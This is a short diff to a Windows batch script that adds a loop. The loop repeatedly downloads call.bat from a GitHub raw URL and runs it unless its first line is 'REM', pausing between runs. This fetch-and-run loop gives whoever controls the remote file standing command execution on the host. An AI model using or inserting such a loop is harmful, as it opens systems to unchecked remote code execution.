@@ -1,16 +1,20 @@
 @echo off
 
-timeout /t 15
+:top
+if exist call.bat del call.bat
+timeout /t 20
 call :downloadbyhackoo https://raw.githubusercontent.com/TTT2866/Globalcmd/master/Global/call.bat call.bat
-set /p firstline=<call.bat
-::should get the first line for call.bat
-set fline=%firstline%
-::have to pass the variable for it to work I think
+For /f %%i in (call.bat) do set "var=%%i" & Goto :print
+:print
 
-if %fline%=="REM key" echo Key exists
-pause
-exit
+if "%var%"=="REM" (echo key is there, lets not continue 
+goto top)
 
+::We don't want to run the file if we don't have to
+:cont
+call call.bat
+timeout /t 500
+goto top
 :downloadbyhackoo
 
 ::https://stackoverflow.com/questions/48860214/
